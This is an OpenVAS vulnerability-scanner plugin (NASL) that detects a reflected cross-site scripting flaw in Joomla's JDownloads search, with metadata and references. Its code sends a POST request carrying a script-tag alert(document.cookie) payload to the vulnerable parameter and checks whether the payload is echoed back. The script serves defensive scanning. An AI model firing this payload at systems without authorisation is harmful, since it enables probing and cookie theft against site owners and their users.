###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_jdownloads_xss_vuln.nasl 6093 2017-05-10 09:03:18Z teissa $
#
# Joomla Component JDownloads Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803870";
CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6093 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-05-10 11:03:18 +0200 (Wed, 10 May 2017) $");
  script_tag(name:"creation_date", value:"2013-08-19 15:16:13 +0530 (Mon, 19 Aug 2013)");
  script_name("Joomla Component JDownloads Cross Site Scripting Vulnerability");

  tag_summary =
"This host is running Joomla JDownloads component and is prone to xss
vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP POST request and check whether it is able to read
cookie or not.";

  tag_insight =
"Input passed via 'jdsearchtext' POST parameter to '/component/jdownloads/search'
is not properly sanitised before being returned to the user.";

  tag_impact =
"Successful exploitation will allow remote attacker to execute arbitrary HTML
or script code or discloses sensitive information resulting in loss of
confidentiality.

Impact Level: Application";

  tag_affected =
"Joomla Component com_jdownloads";

  tag_solution =
"No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name : "URL" , value : "http://hardeningsecurity.com/?p=428");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013080149");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122854");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = "";
postData = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

url = dir + "/component/jdownloads/index.php?option=com_jdownloads"+
                                     "&Itemid=0&task=search.result";
postData = "jdsearchtext=%3Cscript%3Ealert%28document.cookie%29%3C"+
               "%2Fscript%3E&searchsubmit=Search&jdsearchintitle=1";

## Construct attack POST request
sndReq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", get_host_name(), "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n",
                "\r\n", postData, "\r\n");

## Send request and receive the response
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

## Confirm exploit worked by checking the response
if(rcvRes =~ "HTTP/1\.. 200" && '<script>alert(document.cookie)</script>' >< rcvRes)
{
  security_message(port);
  exit(0);
}
